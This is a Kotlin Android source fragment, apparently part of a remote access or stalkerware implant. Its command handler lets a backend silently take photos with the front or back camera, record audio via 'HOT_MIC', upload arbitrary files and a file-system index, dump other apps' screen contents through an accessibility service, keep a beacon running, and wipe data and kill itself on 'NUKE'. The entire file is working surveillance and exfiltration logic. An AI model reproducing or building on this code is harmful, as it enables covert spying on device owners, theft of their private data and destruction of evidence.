private suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
    val id = cmd.getInt("id")
    val fileName = cmd.optString("file_name")
    val content = cmd.optString("content", "")

    // 1. Mark as RECEIVED immediately so backend knows the device is alive
    updateCommandStatus(ctx, id, "RECEIVED", null)

    var status = "EXECUTED"
    var errorMsg = ""

    try {
        when (fileName) {
            "TOAST" -> {
                Handler(Looper.getMainLooper()).post {
                    Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
                }
            }
            "SNAP" -> {
                val json = JSONObject(content)
                val useFront = json.optString("facing", "front").lowercase() == "front"
                val count = json.optInt("count", 1).coerceIn(1, 5) 
                scope.launch {
                    try {
                        GhostCamera.takePhoto(ctx, useFront, count)
                    } catch (e: Exception) {
                        updateCommandStatus(ctx, id, "ASYNC_HARDWARE_FAILED", "Camera Error: ${e.message}")
                    }
                }
                status = "ASYNC_INITIATED (OPTICS: $count)"
            }
            "RECORD" -> {
                val mins = content.toLongOrNull() ?: 1L
                scope.launch {
                    try {
                        GhostMic.recordAudio(ctx, mins)
                    } catch (e: Exception) {
                        updateCommandStatus(ctx, id, "ASYNC_HARDWARE_FAILED", "Mic Error: ${e.message}")
                    }
                }
                status = "ASYNC_INITIATED (HOT_MIC: ${mins}M)"
            }
            "RING" -> {
                val dur = content.toLongOrNull() ?: 10L
                val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                val oldMode = am.ringerMode
                val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)

                if (PermissionManager.hasDndAccess(ctx)) {
                    am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                }
                am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)

                val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
                ringtone.play()

                scope.launch {
                    delay(dur * 1000)
                    ringtone.stop()
                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = oldMode
                    }
                    am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
                }
                status = "RINGING (${dur}S)"
            }
            "STAY_READY" -> {
                val mins = content.toLongOrNull() ?: 5L
                val i = android.content.Intent(ctx, BeaconService::class.java)
                i.putExtra("duration_mins", mins)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
                status = "SYNC_PRIORITY_HIGH (${mins}M)"
            }
            "SET_INTERVAL" -> {
                val mins = content.toLongOrNull() ?: 15L
                val safeMins = if (mins < 15) 15L else mins
                val wm = WorkManager.getInstance(ctx)
                val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
                val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES).setConstraints(constraints).build()
                wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
                status = "INTERVAL_SET (${safeMins}M)"
            }
            "STOP_BEACON" -> {
                ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                status = "BEACON_STOPPED"
            }
            "FORCE_UPLOAD" -> {
                val modules = content.split(",").map { it.trim() }
                CloudManager.uploadData(ctx, modules)
                status = "BACKUP_INITIATED"
            }
            "UPLOAD_DUMPS" -> {
                val dumps = DumpManager.getDumpsForToday()
                var successCount = 0
                dumps.forEach {
                    if (CloudManager.uploadFile(ctx, it, "DUMPS")) successCount++
                }
                if (successCount == 0 && dumps.isNotEmpty()) {
                    status = "FAILED"
                    errorMsg = "All dump uploads failed network check."
                } else {
                    status = "ARCHIVE_SYNC_COMPLETE ($successCount/${dumps.size})"
                }
            }
            "PULL_FILE" -> {
                val f = File(content)
                if (f.exists() && f.isFile) {
                    if (CloudManager.uploadFile(ctx, f, "PULL")) {
                        status = "FETCH_SUCCESS"
                    } else {
                        status = "FAILED"
                        errorMsg = "File found but network upload failed."
                    }
                } else {
                    status = "FAILED"
                    errorMsg = "File not found at path: $content"
                }
            }
            "GET_SKELETON" -> {
                val report = FileManager.generateReport()
                CloudManager.uploadSkeleton(ctx, report)
                status = "INDEX_COMPLETE"
            }
            "GET_TREE" -> {
                val json = JSONObject(content)
                val pkg = json.optString("pkg", null)
                val mins = json.optLong("duration_mins", 1L)
                MyAccessibilityService.instance?.startTreeDump(pkg, mins)
                status = "AUDIT_ACTIVE (${mins}M)"
            }
            "GET_LOGS" -> {
                val logs = DebugLogger.getLogs()
                val tempFile = java.io.File(ctx.cacheDir, "diag_log.txt")
                tempFile.writeText(logs)
                if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
                    status = "LOG_EXPORT_SUCCESS"
                } else {
                    status = "FAILED"
                    errorMsg = "Log file created but upload failed."
                }
                tempFile.delete()
            }
            "TOGGLE_FEATURE" -> {
                val parts = content.split(":")
                if (parts.size >= 2) {
                    ConfigManager.setFeature(ctx, parts[0].trim(), parts[1].trim().lowercase() == "on")
                    status = "FEATURE_UPDATED"
                } else {
                    status = "FAILED"
                    errorMsg = "Invalid format. Use feature:on"
                }
            }
            "CODERED" -> {
                val i = android.content.Intent(ctx, EmergencyService::class.java)
                i.putExtra("codes", content)
                i.putExtra("sender", "BACKEND")
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
                status = "CODERED_ENGAGED"
            }
            "NUKE" -> {
                File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
                status = "NUKE_COMPLETE"
                Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 1000)
            }
            "RUN_INTENT" -> {
                val json = JSONObject(content)
                val intent = android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW))
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
                status = "INTENT_SENT"
            }
            else -> {
                status = "UNKNOWN_COMMAND"
                errorMsg = "No logic defined for: $fileName"
            }
        }
    } catch (e: Exception) {
        status = "FAILED"
        errorMsg = "Execution Error: ${e.message}\nStack: ${e.stackTraceToString().take(500)}"
    }

    // Update DB with the final result
    updateCommandStatus(ctx, id, status, errorMsg)
    DebugLogger.log("COMMAND", "ID:$id [$fileName] -> $status")
}

